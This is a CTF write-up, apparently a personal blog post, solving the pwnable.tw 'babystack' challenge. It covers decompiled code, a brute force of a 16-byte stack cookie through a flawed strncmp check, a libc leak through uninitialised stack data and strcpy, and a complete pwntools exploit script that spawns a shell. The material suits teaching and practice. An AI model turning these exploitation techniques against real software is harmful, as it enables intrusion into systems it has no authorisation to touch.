---
layout: writeup
title: babystack (pwnable.tw)
date: 2023-05-24
---

This was a pwnable I did as prep for DEFCON Quals this year with Laozi & Otso.  They largely carried me on this one but I wanted to document the process for solving the pwnable since it will help cement my understanding `:)`.

### Setting up the environment
For this challenge we are provided the binary `babystack` as well as the `libc.so.6` that the binary uses.

From here we want to use `pwninit` to patch our binary to automatically link with the same libc we got provided (by automatically using another utility called `patchelf`).  To use pwninit, you simply run `pwninit` in the same directory as the binary and libc--it might be the most usable utility I've used for pwning ever.

#### Quick-Aside: Installing pwninit
I got like a million errors from trying to install pwninit since I lacked a couple of dependencies (`openssl`, `liblzma`, and `pkg-config`) two of which I had to install on my ubuntu machine with `sudo apt install libssl-dev liblzma-dev`.

### Reversing the binary

First, we run `pwn checksec` from pwntools to see what type of binary protections we're working with here:

```bash
[*] '/home/milandonhowe.linux/ctf/pwnable/babystack/babystack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

Ok, so everything is enabled.  I'd never seen FORTIFY before but from my limited understanding it's more of a static-time check to prevent buffer overflows from standard libc functions.

Starting first with the `main` function, we get the following C-like output from Ghidra:

```c
undefined8 main(void)
{
  undefined8 *puVar1;
  int iVar2;
  undefined local_68 [64];
  undefined8 urandom_local_28;
  undefined8 local_20;
  char user_in [16];
  
  FUN_00100d30();
  DAT_00302018 = open("/dev/urandom",0); 
  read(DAT_00302018,&urandom_local_28,0x10); // <-- here we can see that the binary reads 16 bytes from /dev/urandom
  puVar1 = DAT_00302020;
  *DAT_00302020 = urandom_local_28;
  puVar1[1] = local_20;
  close(DAT_00302018);
  while( true ) {
    write(1,&prompt_>>,3);
    __read_chk(0,user_in,0x10,0x10);
    // we get 3 options.  entering 2 exits.
    if (user_in[0] == '2') break;
    if (user_in[0] == '3') {
      if (GLOBAL_DATA_00302014 == 0) {
        puts("Invalid choice");
      }
      else {
        magic_copy(local_68);
      }
    }
    else if (user_in[0] == '1') {
      if (GLOBAL_DATA_00302014 == 0) {
        FUN_00100def(&urandom_local_28);
      }
      else {
        GLOBAL_DATA_00302014 = 0;
      }
    }
    else {
      puts("Invalid choice");
    }
  }
  if (GLOBAL_DATA_00302014 == 0) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  // Below we can see that those 16 bytes from /dev/urandom get used as a sort of stack-cookie, as we __stack_chk_fail if they our stack copy of the /dev/urandom doesn't match our global reference.
  iVar2 = memcmp(&urandom_local_28,DAT_00302020,0x10);
  if (iVar2 != 0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```
Ok, so we got a stack cookie of 16 bytes from `/dev/urandom` and it looks like there's a memcpy call that only gets called if we can set the global `GLOBAL_DATA_00302014` to zero which acts as a sort of 'login'-flag.

If we enter `'1'` into the user-input it leads us to another interesting function call of `FUN_00100def(&urandom_local_28);`, which ghidra decompiles as:

```c

void FUN_00100def(char *param_1)

{
  int iVar1;
  size_t __n;
  char local_88 [128];
  
  printf("Your passowrd :");
  FUN_00100ca0(local_88,0x7f);
  __n = strlen(local_88);
  iVar1 = strncmp(local_88,param_1,__n); // <-- this is a bad password check
  if (iVar1 == 0) {
    GLOBAL_DATA_00302014 = 1;
    puts("Login Success !");
  }
  else {
    puts("Failed !");
  }
  return;
}
```

So basically, this checks to see if our input matches the 16 bytes generated by `/dev/urandom`, however it does so in a really bad manner.  The check first checks how long our password is with `strlen` then performs `strncmp` with our `strlen` result as `n` (basically does `strncmp(local_88,param_1, strlen(local_88))`), meaning it will only compare the first n bytes of the password (`param_1` which gets points to our stack cookie).

So, if we enter zero bytes (just hit enter), we will pass the password check.

Even more problematic, we can use this to perform a byte-by-byte brute-force of the stack cookie!  So if we can acquire the stack-cookie, and then find some overflow vulnerability, we can use the stack cookie to bypass the check at the end of the main function. 
```python
def brute_force():
        urandombytes = []
        for i in range(0x10):
                length = len(urandombytes)
                print(f'Bytes so far: {urandombytes}')
                for x in range(1, 256):
                        p.sendline(b'1')
                        p.recv()
                        p.sendline(bytes(urandombytes + [x]))
                        result = p.recv()
                        if result != b'Failed !\n>> ':
                                urandombytes.append(x)
                                p.sendline(b'1')
                                p.recv()
                                break
        print(urandombytes)
        return urandombytes
canary = brute_force() # now we have the stack cookie/canary!!!
```

### Finding a overflow & finding a leak

Even with the stack cookie recovered, we still need to find some overflow or arbitrary write primitive to perform control flow hiijacking.  Looking at `magic_copy(local_68);` (which we can execute after satisfying the flawed password check), we can find some very interesting code:

```c
void magic_copy(char *param_1)
{
  char local_88 [128];
  
  printf("Copy :");
  FUN_00100ca0(local_88,0x3f); // <-- this boils down to basically reading 0x3f bytes into local_88
  strcpy(param_1,local_88);
  puts("It is magic copy !");
  return;
}
```

This is pretty simple, it just copies 63 bytes from local_88 into our parameter (which references `local_68` in the main function).  However, our buffer `local_88` is needlessly large (128 bytes) and crucially, doesn't get zero initialized.  This means when the function prologue gets executed (seen below):

```asm
PUSH RBP
MOV RBP, RSP
SUB RSP, 0x90
```
If we have any data on the stack between `RBP` and `RBP-0x90`, it will remain on the stack. This is interesting for a crucial reason regarding `strcpy` in the `magic_copy` call since `strcpy` will keep copying bytes until it reaches a null-byte from the source parameter.  So for instance, if we copy 63 bytes onto the stack, if the 64th byte happens to have some non-zero bytes, we would copy that onto the stack-frame that the `main` function uses, and get an overflow to control-flow hiijack!

Even better, we can populate that stack space in the password check function--without failling the password check by sending a null-byte at the beginning of our data:

`p.send(p.send(b'\x00' + b'A'*127))`

And sure enough, if we use this mechanism to spam a bunch of data onto the stack we can get a segfault from the program.

However, we still need some sort of leak to actually overwrite the return address and complete the control-flow-hijacking.

### Acquiring the leak
I had absolutely no idea on how to actually get the leak, however Otso ended up unconvering a crucial detail about the binary, which is that the stack space we can copy actually contains multiple addresses (one for the loader, and more critically, one for libc)!

So for instance, if we send the payload:
`b"\x00" + b'A'*63` to the password check, and then perform the `magic_copy`, the main function's stackframe will have an address to the loader (ld) overwrite `random_local_28`, whose content we can brute-force!  However, an `ld` leak isn't super helpful in of itself, so if we send another 8 bytes (`b'C'*8`), we can actually get the top 8 bytes of `random_local_28` populated with a libc leak that we can then brute-force.

### Putting it all together

Ok, so now we can get the leak in gdb (determine its offset from the libc base address) and then find a good one_gadget in the provided libc with `one_gadget ./libc.so.6`, and finally we're ready to build our exploit.

The basic steps are as follows:

1. Brute-force the Stack Canary (this will occassionally fail if the 16 bytes from /dev/urandom include a null-byte since the compare will prematurely stop due to `strlen` not counting past it).
2. Spam the stack with superfluous content in the password check.
3. Trigger `magic_copy` to overwrite `random_local_28` with the libc address thanks to `strcpy` (possible thanks to the superfluous content we spammed on the stack in part 2)
4. Brute-force the libc leak using the same technique for step 1
5. Load stack with overflow payload in the password check (with stack canary & one_gadget return address)
6. Perform `magic_copy` to overwrite the `main` stackframe (thanks again `strcpy`)
7. Exit the user input menu loop (send `2`), thus triggering the control flow-hijacking and spawning a shell.

#### **Solve Script**:
```python
from pwn import *
from time import sleep
#p = process('./babystack_patched')
p = remote("chall.pwnable.tw", 10205)

# brute-force random byte
def brute_force():
	urandombytes = []
	for i in range(0x10):
		length = len(urandombytes)
		print(f'Bytes so far: {urandombytes}')
		for x in range(1, 256):
			print(f"testing {x} out of 255\n", end='\r')
			p.sendline(b'1')
			result = p.recvuntil(b' :', timeout=5)
			p.sendline(bytes(urandombytes + [x]))
			result = p.recv(timeout=5)
			if b'Failed' not in result:
				urandombytes.append(x)
				p.sendline(b'1')
				p.recv(timeout=5)
				break
	print(urandombytes)
	return urandombytes

# get canary
canary = brute_force()
if (len(canary) != 16):
	print("failed to get canary")
	exit(0)
p.sendline(b'1')
print(p.recv(timeout=5))
p.send(b'\x00' + b'A'*63 + b'C'*8)
print(p.recv(timeout=5))
p.sendline(b'3')
print(p.recv(timeout=5))
p.send(b'B'*0x3f)
print(p.recv(timeout=5))
p.sendline(b'1')
print(p.recv(timeout=5))

# get libc
libc_leak = brute_force()

# user-menu reset after brute-force
p.sendline(b'1')
print(p.recv())
libc_leak = libc_leak[8:]

# EXPLOIT TIME
libc_leak = u64(bytes(libc_leak).ljust(8, b'\x00'))

# Print leak for sanity-check
print("Got LIBC leak:", hex(libc_leak))
one_gadget = (libc_leak - 492601) + 0x45216
p.send(b'\x00' + b'A'*63 + bytes(canary) + b"B"*0x18 + p64(one_gadget))
print(p.recv())
p.sendline(b'3')
print(p.recv())
p.send(b'B'*0x3f)
print(p.recv())
p.interactive() # now we get a shell :D
```

And using that I could acquire the flag (note: on remote it took like 20 minutes to run, thanks network latency!!!).

